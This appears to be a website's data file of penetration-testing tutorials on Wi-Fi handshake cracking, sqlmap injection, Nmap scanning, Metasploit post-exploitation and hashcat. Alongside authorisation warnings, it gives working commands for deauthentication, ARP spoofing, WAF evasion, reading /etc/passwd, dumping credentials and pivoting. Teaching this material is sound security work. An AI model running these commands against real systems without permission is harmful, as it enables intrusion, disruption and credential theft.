The classic WPA2-Personal assessment does not attack the encryption directly. It captures the **four-way handshake** — the exchange that happens when a client joins the network — and then attacks the password *offline*, at your own pace, on your own hardware. The handshake contains enough to verify a password guess without ever touching the network again.

\`\`\`bash
# Lock onto one AP and channel, and write captures to a file.
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# In a second terminal: nudge a connected client to reconnect, so we catch
# the handshake it sends when it comes back.
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
\`\`\`

That second command is a **deauthentication attack**: it forges frames telling a client it has been disconnected, so it reconnects and produces a fresh handshake for you to capture. It is also the most disruptive thing in the wireless toolkit — you are knocking real devices off the network, and on a production environment that is a genuine interruption you must have authorised. When \`airodump-ng\` shows \`WPA handshake: AA:BB:...\` in its header, you have what you need and can stop.

Then the password falls — or does not — offline:

\`\`\`bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
\`\`\`

This is a dictionary attack, and it only ever finds passwords that are in your wordlist. A WPA2 network with a long random passphrase is, for practical purposes, safe from this — which is the finding you report when it holds. For serious cracking, convert the capture to hashcat's format (\`hcxpcapngtool\`) and let a GPU do the work; the companion Hashcat guide covers mode \`22000\`.

## PMKID: the attack that needs no client

Newer than the handshake capture, the **PMKID attack** grabs the material it needs directly from the access point, without waiting for a client to connect and without deauthenticating anyone. On an AP that is vulnerable to it, this is both faster and far quieter — no disruption, no client required.

\`\`\`bash
sudo hcxdumptool -i wlan0mon -o capture.pcapng
# then convert and crack the PMKID with hashcat mode 22000
\`\`\`

Its existence is also why "just use a strong passphrase" remains the real defence: PMKID or handshake, the offline crack still comes down to whether the password is guessable.

## Faster surveys with wifite

For assessing many networks rather than one, \`wifite\` orchestrates the aircrack-ng tools automatically — it will scan, capture handshakes and PMKIDs, and attempt cracks against the targets you select.

\`\`\`bash
sudo wifite --kill
sudo wifite --wpa --dict /usr/share/wordlists/rockyou.txt
\`\`\`

It is a time-saver, not a replacement for understanding what it does — every action it takes is one of the manual steps above, including the deauth, so the same authorisation and disruption caveats apply.

## Rogue APs and the client-side attack

Not every wireless risk is about cracking the AP. An **evil twin** is a rogue access point broadcasting the same SSID as the legitimate one, hoping clients — or people — connect to it instead. \`bettercap\` is the tool for the man-in-the-middle side of an assessment once a client is talking to you:

\`\`\`bash
sudo bettercap -iface wlan0
> net.probe on
> set arp.spoof.targets 192.168.1.0/24
> arp.spoof on
\`\`\`

This tests a different control entirely: whether clients validate what they connect to, whether the network isolates clients from each other, and whether traffic that should be encrypted end-to-end actually is. On a corporate assessment it is often more revealing than the passphrase crack, because it measures how the humans and their devices behave, not just how strong a string is.

## What the assessment is really checking

Pull the individual attacks up to the level of a report, and a wireless assessment answers a handful of questions:

- **Encryption.** WPA3 (SAE) resists the offline dictionary attack that WPA2 permits; WPA2-AES is acceptable with a strong passphrase; WPA2-TKIP is deprecated; WEP is broken and any WEP network is a finding on its own.
- **Passphrase strength.** If the handshake cracks against a wordlist, the passphrase is the problem, not the protocol.
- **Enterprise auth.** 802.1X/RADIUS (WPA2/3-Enterprise) replaces the shared passphrase with per-user credentials — the right answer for a corporate network, and worth checking is actually enforced rather than sitting alongside an open guest SSID.
- **Client behaviour.** Do devices connect to any SSID with the right name? Are clients isolated from one another? Is there a rogue AP already present?

## Practising legally

You cannot practise this on "some network nearby" — that is the offence. Build a target you own: a spare home router you configure with a deliberately weak WPA2 passphrase, an old phone as the client. Deauth it, capture the handshake, crack your own password. That teaches the entire workflow with zero legal exposure, and it is the only honest way to get the reps in.

## Running the analysis without a Wi-Fi rig

Capturing handshakes needs a physical radio in the room, so the capture step is always local — no cloud tool can sniff air it cannot reach. What does not need to be local is the *cracking*: once you have a \`.cap\` or \`.pcapng\`, converting and cracking it is a compute job. CyberSec Pro runs the aircrack-ng and hashcat side of the work — you upload the capture, choose the wordlist and mode, see the command before it runs, and watch progress stream back, with the job isolated in its own container and the capture treated as the sensitive material it is. The radio stays in your hands; the GPU work does not have to.
    `,
  },

  "sqlmap-injection-guide": {
    slug: "sqlmap-injection-guide",
    title: "SQLMap: Automated SQL Injection Testing Guide",
    category: "Tools",
    date: "2026-03-10",
    author: "Semih Kilic",
    excerpt: "Why the injection technique in the first result sets the pace of the whole engagement, how to test the request the app actually accepted, and which flags will damage a live system.",
    tags: ["sqlmap", "sql-injection", "web-security", "penetration-testing"],
    content: `
## What sqlmap does that a manual test does not

You can find a SQL injection by hand: put a quote in a parameter, watch the page break, work out the query behind it. sqlmap does that too, but the reason to reach for it is not detection — it is the part *after* detection. Once it confirms an injectable parameter, it fingerprints the database, works out how to read data through the specific flaw it found, and enumerates schemas and tables without you writing a single \`UNION SELECT\`. The tedious, error-prone part is the part it automates.

That is also why it is dangerous to point casually at a live system. sqlmap is not a scanner that looks and leaves; by default it will extract data, and with the wrong flag it will try to run commands on the host. Everything below assumes you have written authorisation for the target, and the last section is about staying inside that authorisation.

## The first command, and reading its answer

\`\`\`
sqlmap -u "https://target.example.com/product?id=1"
\`\`\`

That tests the \`id\` parameter and nothing else. sqlmap sends a series of crafted values and watches how the responses differ — a payload that changes the page one way, its logical opposite that changes it back. What you are waiting for is a line like:

\`\`\`
[INFO] GET parameter 'id' is 'MySQL >= 5.6 AND time-based blind' injectable
\`\`\`

Read that carefully, because it tells you two things that shape everything after. The DBMS — MySQL here — decides which enumeration commands are available. And the **technique** — time-based blind — decides how slow the rest of your session will be. A \`UNION\`-based injection returns data in the page and is fast. A time-based blind injection extracts data one bit at a time by making the database sleep, and dumping a large table that way can take hours. If sqlmap reports only a time-based flaw, that is not a warning you can ignore; it is the pace of the entire engagement.

## Injection points beyond the query string

Most parameters worth testing are not in the URL.

\`\`\`
# POST body
sqlmap -u "https://target.example.com/login" \\
  --data="username=admin&password=test"

# A specific parameter, when the request has many
sqlmap -u "https://target.example.com/search" \\
  --data="q=shoes&sort=price&page=2" -p q

# An authenticated session — the injection is usually behind the login
sqlmap -u "https://target.example.com/account?tab=orders" \\
  --cookie="session=8f3a...; role=user"

# A value inside a header, marked with *
sqlmap -u "https://target.example.com/" \\
  --headers="X-Forwarded-For: 1.1.1.1*"
\`\`\`

The single most useful input, though, is not a flag at all. Capture the real request in Burp or your browser's dev tools, save it to a file, and hand sqlmap the whole thing:

\`\`\`
sqlmap -r request.txt
\`\`\`

Now sqlmap tests with the exact headers, cookies and body the application already accepted. This solves the most common "it works by hand but sqlmap finds nothing" problem, which is almost always a missing header, a CSRF token, or a session cookie that the manual test had and the tool did not.

## Level and risk: the two dials that matter

\`\`\`
sqlmap -u URL --level=1 --risk=1    # the default
sqlmap -u URL --level=3 --risk=2    # a reasonable step up
sqlmap -u URL --level=5 --risk=3    # everything, including the payloads that can hurt
\`\`\`

\`--level\` (1–5) widens *where* sqlmap looks: higher levels test more parameters, and crucially, levels 2 and 3 start testing cookies and headers that the default leaves alone. \`--risk\` (1–3) changes *what* it sends. This is the dial to respect. Risk 3 includes \`OR\`-based boolean payloads, and an \`OR\`-based injection into an \`UPDATE\` statement can match every row in a table — which on a live application means editing every record, not reading one. The default of \`--level=1 --risk=1\` is not timidity; it is what you run against a system you cannot afford to damage.

Raise the level first when detection is coming up empty. Raise the risk only when you understand what the extra payloads do and the target can absorb the consequence.

## Enumeration, from database down to rows

Once a parameter is confirmed injectable, you walk down the tree:

\`\`\`
sqlmap -r request.txt --dbs                       # which databases exist
sqlmap -r request.txt -D shopdb --tables          # tables in one of them
sqlmap -r request.txt -D shopdb -T users --columns# columns in one table
sqlmap -r request.txt -D shopdb -T users \\
  -C username,password_hash --dump                # just the columns you need
\`\`\`

Notice the last command names two columns. The instinct is \`--dump\` on the whole table, or worse \`--dump-all\` across every database. Over a time-based blind injection that is the difference between a two-minute extraction and one that runs overnight and gets you noticed. Take the schema first, decide what actually proves the finding — usually a handful of rows and the columns that show the data is real — and pull only that. A penetration test demonstrates access; it does not need to exfiltrate the customer table to do so.

\`--current-user\`, \`--current-db\`, \`--is-dba\` and \`--passwords\` answer "how bad is this" quickly and cheaply, and they are a better opening move than dumping anything.

## When there is a WAF in the way

A web application firewall that blocks obvious payloads is common, and sqlmap has room to work around it — legitimately, on a target you are authorised to test.

\`\`\`
sqlmap -r request.txt --random-agent
sqlmap -r request.txt --tamper=space2comment,between --random-agent
sqlmap -r request.txt --delay=1 --safe-url=https://target.example.com/ --safe-freq=10
\`\`\`

Tamper scripts rewrite payloads into forms a filter may not recognise — \`space2comment\` replaces spaces with inline comments, \`between\` rewrites \`>\` comparisons, and there are dozens more for specific filters. \`--random-agent\` avoids the default sqlmap user-agent that many WAFs block on sight. And \`--delay\` with \`--safe-url\`/\`--safe-freq\` slows the session and periodically hits a harmless page, which both reduces load and makes the traffic look less like a machine hammering one endpoint. This is evasion in the service of a sanctioned test; the same techniques against a system you do not own are simply an attack.

## The commands to think twice about

\`\`\`
sqlmap -r request.txt --os-shell       # command execution on the DB host
sqlmap -r request.txt --file-read="/etc/passwd"
sqlmap -r request.txt --sql-shell       # an interactive SQL prompt
\`\`\`

\`--os-shell\` is where sqlmap stops reading the database and starts trying to run operating-system commands on the server behind it — by writing a payload to disk, abusing a stored procedure, or a similar path depending on the DBMS. When it works it is the strongest possible demonstration of impact. It is also the loudest thing in the tool, it writes files to the target, and it will trip any monitoring worth the name. On a real engagement, run it only when the rules of engagement explicitly permit command execution, and know that "explicitly permit" means it is written in the scope document, not that nobody said you couldn't.

## Sessions, batch mode, and not repeating work

\`\`\`
sqlmap -r request.txt --batch                     # take the default at every prompt
sqlmap -r request.txt --dbs --flush-session       # start clean, ignore the cache
\`\`\`

sqlmap caches what it learns in a per-target session file, so a second run does not re-detect an injection it already found — it picks up where it left off. \`--batch\` answers every interactive prompt with the sensible default, which is what you want in a script or a long enumeration you don't intend to babysit. Reach for \`--flush-session\` only when you have changed something about the target or the test and want sqlmap to stop trusting its cache.

## A short checklist before you run it in anger

- The target is in a written scope, and data extraction (and, separately, command execution) is permitted by that document.
- You are testing with \`-r request.txt\` from a real captured request, so authentication and headers match.
- You start at \`--level=1 --risk=1\` and raise deliberately, not reflexively.
- You enumerate the schema before dumping, and dump the columns that prove the finding rather than the whole database.
- You practise against a deliberately vulnerable app first — DVWA, OWASP Juice Shop, or the \`testphp.vulnweb.com\` target Acunetix publishes for exactly this — before you touch anything real.

## Running it without the local install

sqlmap is a Python tool and installs cleanly, and running it yourself is a fine way to work. If you would rather not manage a Python environment and a WAF-evasion toolkit on your own machine, CyberSec Pro runs sqlmap from a browser: you fill in the target and options on a form, see the exact command before it runs, and the output streams back as it happens. The scan executes server-side in a dedicated container, one process per job, and credentials you supply for an authenticated test are held in memory for that job and never written to the database, logs or backups.

Whichever way you run it, the discipline is the same. Read the technique in the first result, enumerate before you dump, and never send a risk-3 payload at something you cannot afford to break.
    `,
  },
  "nmap-network-scanning": {
    slug: "nmap-network-scanning",
    title: "Nmap: Complete Network Scanning & Discovery Guide",
    category: "Tools",
    date: "2026-02-28",
    author: "Semih Kilic",
    excerpt: "Why your scan found nothing, what the six port states actually mean, and the two-pass workflow that scales past one host. With real output from a host we control.",
    tags: ["nmap", "network-scanning", "port-scanning", "reconnaissance"],
    content: `
## What Nmap is actually telling you

Nmap sends packets and reports what came back. That sounds obvious, and it is the single most useful thing to keep in mind, because every line of output is an *inference* drawn from a response — or from the absence of one. A port marked \`open\` means a probe got an acknowledgement. A port marked \`filtered\` means nothing came back at all, and Nmap cannot tell you whether that is a firewall, a dropped packet, or a host that stopped answering because you scanned it too fast.

Most bad scan results come from forgetting this. The tool is not reading the target's configuration; it is guessing from the outside, and it will tell you how confident it is if you read carefully.

## Your first scan, and what the default quietly leaves out

\`\`\`
nmap scanme.nmap.org
\`\`\`

That scans **1,000 TCP ports**, not 65,535. They are the thousand ports Nmap's authors found most often open in a large internet survey, and they catch the overwhelming majority of real services. They also miss the interesting ones: an admin panel on 8443, a forgotten Redis on 6379, a debug listener someone left on 31337.

So the default is the right first scan and the wrong last one:

\`\`\`
# Every TCP port. Slower, and the one that finds the surprises.
nmap -p- target.example.com

# A middle ground — the 3,000 most common.
nmap --top-ports 3000 target.example.com

# Exactly what you care about.
nmap -p 22,80,443,8080,8443 target.example.com
\`\`\`

If you only ever run one command against a host you are responsible for, make it \`-p-\`. Every "we didn't know that was exposed" incident starts with a scan that stopped at 1,000.

## When a scan finds nothing: host discovery

Before touching a single port, Nmap decides whether the host is even up. On a local network that is an ARP request; across the internet it is a mix of ICMP echo, a TCP ACK to 80, a SYN to 443, and an ICMP timestamp request. If none of those come back, Nmap declares the host down and **never scans it**.

Plenty of production hosts drop all of it. That produces the most common false conclusion in network scanning: "the host is down", when it is serving traffic perfectly well.

\`\`\`
# Skip discovery. Treat the host as up and scan it regardless.
nmap -Pn target.example.com

# The opposite: discovery only, no port scan. A fast inventory sweep.
nmap -sn 10.0.0.0/24
\`\`\`

\`-sn\` over a /24 is the fastest honest answer to "what is actually on this network". Run it first, then scan what it finds.

## Choosing a scan type

\`\`\`
nmap -sS target    # SYN scan — needs root
nmap -sT target    # TCP connect — works unprivileged
nmap -sU target    # UDP — a different animal entirely
\`\`\`

**\`-sS\`** sends a SYN, waits for the SYN/ACK, and sends a RST instead of completing the handshake. It is the default *when you have privileges*, because it is faster and because the connection never completes, so many applications never log it. It needs raw sockets, which means root or \`CAP_NET_RAW\`.

**\`-sT\`** asks the operating system to open a real connection. It works without privileges and it is what Nmap silently falls back to if you forget \`sudo\`. The handshake completes, so the target's application logs see a connection from you. If you are scanning without privileges and wondering why the target noticed, this is why.

**\`-sU\`** is the one people skip, and skipping it is how DNS, SNMP, NTP and IKE stay invisible in reports. UDP has no handshake: a closed port answers with ICMP port-unreachable, an open port usually answers with nothing at all — which looks identical to a firewall drop. Nmap has to wait out a timeout on every non-responsive port, and Linux rate-limits the ICMP replies it depends on. A full UDP scan of 65,535 ports can genuinely take hours. Scope it:

\`\`\`
nmap -sU --top-ports 100 target.example.com
\`\`\`

## Six port states, not two

This is where most reports go wrong. Nmap has six states and people read only two of them.

| State | What it means |
|---|---|
| \`open\` | Something is listening and it answered |
| \`closed\` | The host answered and refused — the host is up, nothing is on that port |
| \`filtered\` | Nothing came back. A firewall is probably dropping your probe |
| \`unfiltered\` | Reachable, but Nmap cannot tell open from closed (ACK scans) |
| \`open\\|filtered\` | No answer, and for this scan type that is ambiguous (common on UDP) |
| \`closed\\|filtered\` | Ambiguity between closed and filtered (idle scans) |

\`closed\` and \`filtered\` are not synonyms, and the difference matters more than it looks. A host that returns \`closed\` for 999 ports and \`filtered\` for one is telling you that one port is being deliberately protected — which is usually the interesting one. A host that returns \`filtered\` for everything is behind a default-deny firewall and your scan is measuring the firewall, not the host.

## Version detection is a guess, with a confidence level

\`\`\`
nmap -sV target.example.com
nmap -sV --version-intensity 9 target.example.com   # try every probe
nmap -A target.example.com                          # -sV, -sC, -O and traceroute
\`\`\`

\`-sV\` connects and compares what the service says against a fingerprint database of thousands of signatures. When the service is chatty, the result is excellent. When it isn't, the result is thin — and thin is the correct answer, not a failure.

Here is a scan against a host we control, so we can compare the output to the configuration behind it:

\`\`\`
PORT     STATE  SERVICE       VERSION
80/tcp   open   http          nginx
3389/tcp open   ms-wbt-server Microsoft Terminal Service
\`\`\`

Nginx is reported with no version at all. That is not Nmap giving up — it is \`server_tokens off\` in the nginx configuration, which strips the version from the \`Server\` header. Nmap reported exactly as much as the service was willing to say. If you are on the defending side, that line is what a hardened banner is supposed to look like.

\`-A\` is the convenient bundle: version detection, the default script set, OS detection and a traceroute. It is also loud and slow. Use it when you have already decided a host is worth the attention, not as your opening move.

## NSE: the part that gets skipped

The Nmap Scripting Engine is where the tool stops being a port scanner. Roughly 600 scripts ship with it, grouped into categories.

\`\`\`
nmap -sC target                           # the "default" category
nmap --script vuln target                 # known-vulnerability checks
nmap --script ssl-enum-ciphers -p 443 t   # every cipher suite the TLS stack offers
nmap --script http-enum -p 80,443 target  # common paths and admin panels
nmap --script smb-os-discovery -p 445 t   # Windows host details over SMB
\`\`\`

Two categories deserve care. \`safe\` scripts do not crash services or use significant bandwidth. \`intrusive\` ones might — and \`vuln\` pulls in a number of them. \`--script vuln\` against a production box during business hours is a real way to cause an outage you will have to explain. Read what a script does before you point it at something you do not own:

\`\`\`
nmap --script-help ssl-enum-ciphers
\`\`\`

## Speed, and what you trade for it

\`\`\`
nmap -T4 target                    # a sensible default on a good network
nmap --min-rate 1000 target        # at least 1,000 packets per second
nmap -p- --min-rate 5000 target    # all 65,535 ports, fast, on a LAN
\`\`\`

\`-T0\` through \`-T5\` set timing templates. \`-T4\` is the usual choice; \`-T5\` is aggressive enough that on a congested link or through a rate-limiting firewall it will start **missing open ports** — Nmap gives up on a retransmit before the answer arrives. A fast scan that misses a service is worse than a slow one, because you will write "not exposed" in a report and be wrong.

\`--min-rate\` is the more honest control: it sets a packet rate floor rather than a vague aggression level, and it makes your scans reproducible. If you are scanning across the internet rather than a LAN, start lower and watch for a rising \`filtered\` count — that is the signal you are being rate-limited and your results are degrading.

## Output you can actually use later

\`\`\`
nmap -oA scan-2026-09-13 target.example.com
\`\`\`

\`-oA\` writes all three formats at once: \`.nmap\` (what you saw on screen), \`.gnmap\` (one line per host, for \`grep\` and \`awk\`), and \`.xml\`.

Take the XML seriously. It is the format every other tool reads — report generators, \`ndiff\`, and anything that wants structured findings. And with two scans you can diff them:

\`\`\`
ndiff monday.xml friday.xml
\`\`\`

That output — what opened, what closed, what changed version between two dates — is more useful to most organisations than any single scan. A port that appeared on Friday is an event. A port that was there both times is inventory.

## A workflow that scales past one host

For anything bigger than a single machine, scan in two passes.

\`\`\`
# 1. Who is alive?
nmap -sn 10.0.0.0/16 -oG alive.gnmap
grep "Status: Up" alive.gnmap | awk '{print $2}' > live-hosts.txt

# 2. What is on them? Fast and wide first.
nmap -iL live-hosts.txt -p- --min-rate 2000 -oA wide

# 3. Version and script detail, only on the ports you actually found.
nmap -iL live-hosts.txt -p 22,80,443,3306,8080 -sV -sC -oA deep
\`\`\`

The mistake is running \`-A -p-\` against a whole range in one go. It takes days, it is loud enough to generate tickets, and it produces one enormous file nobody reads. Wide-and-shallow, then narrow-and-deep, gets the same information in a fraction of the time.

## Before you scan anything

Port scanning a host you do not own or have written permission to test is unlawful in many jurisdictions, and "I was only looking" has not been a successful defence. Get authorisation in writing, keep the scope in the document, and stay inside it. \`scanme.nmap.org\` exists precisely so that people can practise legally — the Nmap project maintains it for that purpose, and asks that you not hammer it.

On your own infrastructure, none of this applies and you should be scanning it regularly. The asset you do not know about is the one that gets you.

## Running this without the local setup

Everything above runs on an Nmap install you maintain yourself, and that is a perfectly good way to work. If you would rather not maintain it, CyberSec Pro runs Nmap — with the flags above, on a generated form, with the command shown before it executes — from a browser, and streams the output as it arrives. The scan runs server-side in a dedicated container, one process per job, and the result is stored so you can diff it against the next one.

Either way, the thinking is the same: know what the states mean, scan the whole port range at least once, and never trust a scan that was faster than the network.
    `,
  },
  "metasploit-exploitation": {
    slug: "metasploit-exploitation",
    title: "Metasploit Post-Exploitation: Meterpreter, Privilege Escalation and Pivoting",
    category: "Tools",
    date: "2026-02-15",
    author: "Semih Kilic",
    excerpt: "What to do once you have a session: orienting with getuid, escalating by enumeration rather than repetition, harvesting credentials responsibly, and pivoting to hosts you were never exposed to.",
    tags: ["metasploit", "post-exploitation", "meterpreter", "privilege-escalation"],
    content: `
## The session is the beginning, not the end

Landing an exploit is the part beginners celebrate and experienced testers treat as step one. A shell on one machine, as a low-privilege user, with no way back in if the connection drops, proves very little on its own. The value of an engagement is in what the session lets you demonstrate next: that you could become administrator, read the credentials that unlock the rest of the network, and reach systems that were never exposed to you directly. That is post-exploitation, and Meterpreter is the tool built for it.

This guide assumes you already have a Meterpreter session — if you do not, the companion guide covers getting one. Everything here runs at the \`meterpreter >\` prompt.

## Why Meterpreter, and not a plain shell

An exploit can hand you an ordinary command shell, and sometimes that is all you get. Meterpreter is worth choosing when you can because of *how* it runs: it lives in the memory of the process it landed in and never writes itself to disk, it speaks to you over an encrypted channel, and it exposes one consistent set of commands whether the target is Windows or Linux. A plain shell makes you fight the target's own tooling — different commands on every OS, everything written to disk, everything in the clear. Meterpreter gives you a stable platform to work from.

## Orient before you act

The first minute in a new session is for finding out where you are, not for firing commands:

\`\`\`bash
meterpreter > sysinfo        # OS, architecture, hostname, domain
meterpreter > getuid         # who you are running as
meterpreter > getpid        # which process you are living inside
meterpreter > ipconfig       # the target's networks — note ones you can't reach yet
\`\`\`

\`getuid\` decides your whole next move. If it already reports \`NT AUTHORITY\\SYSTEM\` or \`root\`, you skip privilege escalation entirely. If it reports an ordinary user, that is the first problem to solve. And \`ipconfig\` is where pivoting begins: a second network interface on the compromised host, on a subnet you could not touch from outside, is the map of where you go next.

## Getting from user to administrator

\`\`\`bash
meterpreter > getsystem
\`\`\`

\`getsystem\` tries a handful of known local privilege-escalation techniques and, on an unpatched or misconfigured host, may take you straight to SYSTEM. When it works, it is the fastest path. When it fails — and on a patched, modern system it usually does — the honest next step is enumeration, not repetition. Background the session and run a local exploit suggester:

\`\`\`bash
meterpreter > background
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION 1
msf6 > run
\`\`\`

That checks the session against local exploits the target may be vulnerable to and hands you a shortlist to try. Escalation on a well-maintained system is a research problem — which missing patch, which weak service permission, which misconfiguration — not a single magic command, and treating \`getsystem\` as if it always works is how beginners get stuck.

## Harvesting credentials — carefully

Once you are SYSTEM, credentials are the prize, because they turn one compromised host into access across the network:

\`\`\`bash
meterpreter > hashdump                 # local SAM password hashes
meterpreter > load kiwi                 # the in-memory Mimikatz extension
meterpreter > creds_all                 # cached credentials from memory
\`\`\`

Two cautions that matter on a real engagement. \`hashdump\` and \`kiwi\` read the most sensitive data on the machine, and on a monitored network they are exactly what an EDR is watching for — loading kiwi may be the loudest thing you do all day. And what you recover is client data under your custody: it belongs in the report and in an encrypted store, not left in your loot directory or pasted into a chat. Handle it like the liability it is.

## Reaching what you could not see: pivoting

This is the technique that turns a single foothold into a network compromise, and the reason \`ipconfig\` was the first thing you ran. If the host you own sits on a second subnet — say it can reach \`10.0.0.0/24\`, which you never could from outside — you can route traffic through it:

\`\`\`bash
meterpreter > run autoroute -s 10.0.0.0/24
meterpreter > background
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 10.0.0.0/24
msf6 > run
\`\`\`

\`autoroute\` tells the framework to send traffic for that subnet through your session, so Metasploit's own scanners and exploits now reach machines that were never exposed to you. Add a \`socks_proxy\` module on top and your other tools — a browser, sqlmap, anything that honours a SOCKS proxy — can reach the internal network too. This is the step where an assessment stops being about one server and starts being about the client's actual exposure.

## Files, screenshots, and gathering evidence

\`\`\`bash
meterpreter > download C:\\Users\\Administrator\\Desktop\\notes.txt
meterpreter > upload ./tool.exe C:\\Windows\\Temp\\report.exe
meterpreter > screenshot
meterpreter > pwd
\`\`\`

A pentest report is only as persuasive as its evidence. A screenshot of the target's desktop, the contents of a sensitive file, the output of \`getuid\` showing SYSTEM — these are what turn "the host was vulnerable" into "here is what an attacker would have taken". Collect proof as you go, and note the timestamps.

## Persistence, and why to be reluctant with it

Metasploit can install a mechanism that re-opens your session after a reboot. On a real client engagement you should be reluctant to use it, and never without explicit permission in the rules of engagement, because it means leaving a backdoor on a system you do not own. If it is in scope, it is also a cleanup obligation: whatever you install, you are responsible for removing, and an unremoved persistence mechanism is a finding against *you*. The safer habit is to document that persistence *was achievable* — you had the access to install it — rather than actually planting one.

## Clean up after yourself

Post-exploitation leaves traces, and a professional removes them:

- Delete files you uploaded (\`rm\` inside Meterpreter, or the target's own commands).
- Remove any persistence mechanism you were authorised to install.
- Record every change you made — accounts, files, services — so the client can verify the environment is back to where it started.

Leaving a lab dirty is a bad habit; leaving a client's production system dirty is a professional failure.

## The rule that sits above all of it

Every command here is illegal against a system you have not been authorised in writing to test, and the sensitive ones — credential dumping, persistence, pivoting to new hosts — are exactly the actions a rules-of-engagement document scopes explicitly. "I had a shell so I kept going" is not authorisation. Stay inside the written scope, and practise the whole chain against Metasploitable or a HackTheBox target until the workflow is muscle memory before you run it anywhere real.

## Running this without the local setup

Post-exploitation is where a self-managed Metasploit install earns its keep, and running it yourself is a fine way to work. If you would rather not maintain the framework and its extensions, CyberSec Pro runs Metasploit's modules from a browser — module and options on a form, the command shown before it runs, output streamed back — with each job in its own container and any credentials you supply held in memory for that job alone and never written to disk. The discipline is unchanged: orient first, escalate by enumeration rather than repetition, treat harvested credentials as client property, and clean up everything you touched.
    `,
  },
  "hashcat-password-cracking": {
    slug: "hashcat-password-cracking",
    title: "Hashcat: GPU-Accelerated Password Cracking Mastery",
    category: "Tools",
    date: "2026-01-28",
    author: "Semih Kilic",
    excerpt: "You do not reverse a hash — you out-guess it. Why the algorithm's speed decides your whole strategy, why rules out-crack giant wordlists, and how to shape a mask instead of brute-forcing the keyspace.",
    tags: ["hashcat", "password-cracking", "hash-cracking", "security-audit"],
    content: `
## What you are really doing when you "crack" a hash

Hashcat does not reverse a hash — nothing does. It guesses passwords, hashes each guess with the same algorithm, and compares. Everything about using it well follows from that one fact: your job is to make good guesses quickly, and the two levers you have are *how fast* you can hash (the algorithm and the GPU) and *how good* your guesses are (wordlists, rules and masks). A cracking session that fails is almost never a limit of the tool; it is a limit of one of those two levers.

This is a legitimate and routine part of security work: auditing whether your organisation's password policy actually holds, recovering your own lost credentials, and — in a sanctioned engagement — proving that captured hashes lead to plaintext. All of it assumes the hashes are yours to test.

## Tell hashcat what it is looking at: the hash mode

The \`-m\` flag is the first thing to get right, because a wrong mode means every guess is hashed the wrong way and nothing will ever match. A few you will meet constantly:

| \`-m\` | Algorithm | Where you find it |
|---|---|---|
| 0 | MD5 | old web apps, CTFs |
| 1000 | NTLM | Windows account hashes |
| 1800 | sha512crypt | Linux \`/etc/shadow\` |
| 3200 | bcrypt | modern web app databases |
| 5600 | NetNTLMv2 | captured from SMB on a network |
| 13100 | Kerberos RC4 (Kerberoast) | Active Directory service accounts |
| 22000 | WPA-PBKDF2 | Wi-Fi handshakes |

The number matters less than the habit: identify the hash before you attack it. If you are unsure, \`hashcat --identify hashes.txt\` will suggest candidate modes, and \`--example-hashes\` prints a sample of every format so you can compare shapes.

## The speed of an algorithm is the whole game

Here is the single most important thing a bullet list of commands never tells you. These algorithms are not in the same universe of speed:

- **MD5 and NTLM** are *fast* hashes — a modern GPU computes them in the hundreds of billions per second. A weak Windows password falls in minutes.
- **bcrypt and sha512crypt** are *slow by design*. bcrypt has a deliberate work factor that a GPU cannot shortcut; the same hardware that does 100+ billion MD5 guesses a second manages a few hundred thousand bcrypt guesses a second — five or six orders of magnitude slower.

The practical consequence: against MD5, brute force is on the table. Against bcrypt, brute force is hopeless and you must spend your limited guesses wisely — a targeted wordlist with rules, not a mask over the whole keyspace. Knowing which kind of hash you hold decides your entire strategy, and it is why "just brute-force it" is beginner advice that stops working the moment the target uses a real password-storage algorithm.

## The four attack modes, and when each earns its place

\`\`\`bash
# -a 0  Dictionary: try every word in a list. Your default first move.
hashcat -m 1000 -a 0 hashes.txt rockyou.txt

# -a 0 -r  Dictionary + rules: mutate each word. The highest-yield attack there is.
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r rules/best64.rule

# -a 3  Mask (brute force): every string matching a pattern. Only for fast hashes.
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?d?d?s

# -a 6  Hybrid: a word followed by a mask. Catches "password2026!" patterns.
hashcat -m 1000 -a 6 hashes.txt rockyou.txt ?d?d?d?d
\`\`\`

Start with a plain dictionary. It is fast and it catches the genuinely weak passwords first, which is often all an audit needs to prove its point. Then add rules — this is where most real cracks happen, and it deserves its own section below. Reach for masks only against fast hashes, and only for patterns you have reason to expect.

## Masks: brute force with a shape

A mask attack (\`-a 3\`) tries every string that fits a pattern, built from character-set tokens:

- \`?l\` lowercase, \`?u\` uppercase, \`?d\` digit, \`?s\` special, \`?a\` all of the above.

So \`?u?l?l?l?l?d?d?s\` is "capital, four lowercase, two digits, a symbol" — the exact shape of \`Summer26!\` and a million passwords like it. This matters because unrestricted brute force grows impossibly fast: every position you add multiplies the keyspace by the size of its character set, and \`?a?a?a?a?a?a?a?a\` (eight of anything) is already tens of quadrillions of candidates. A well-chosen mask that encodes how people actually build passwords turns an impossible search into a finishable one. Masks are precision, not brute strength.

## Rules are where the cracks come from

A rule file mutates each dictionary word on the fly — capitalise it, append digits, swap \`a\` for \`@\`, reverse it, double it. This is high-yield because it mirrors exactly how people modify a base word to satisfy a policy: \`password\` becomes \`Password1\`, \`P@ssw0rd!\`, \`password2026\`.

\`\`\`bash
# best64: 64 of the most productive rules. The one to start with.
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r rules/best64.rule

# Stack rule files to multiply their effect (and the runtime).
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r rules/best64.rule -r rules/toggles1.rule
\`\`\`

\`best64.rule\` ships with hashcat and is the right default — a small, dense set that catches the common mutations without exploding your runtime. \`dive.rule\` and \`OneRuleToRuleThemAll\` are far larger and find more, at a cost in time. The insight worth keeping: a modest wordlist with a good rule set beats a giant wordlist with none, because the rules generate the mutations a static list can never contain.

## Getting more from the hardware

\`\`\`bash
hashcat -b                              # benchmark: what your GPU does per hash type
hashcat -m 1000 -a 0 h.txt w.txt -O     # optimised kernels — faster, caps password length
hashcat -m 1000 -a 0 h.txt w.txt -w 3   # workload 3: push the GPU harder
\`\`\`

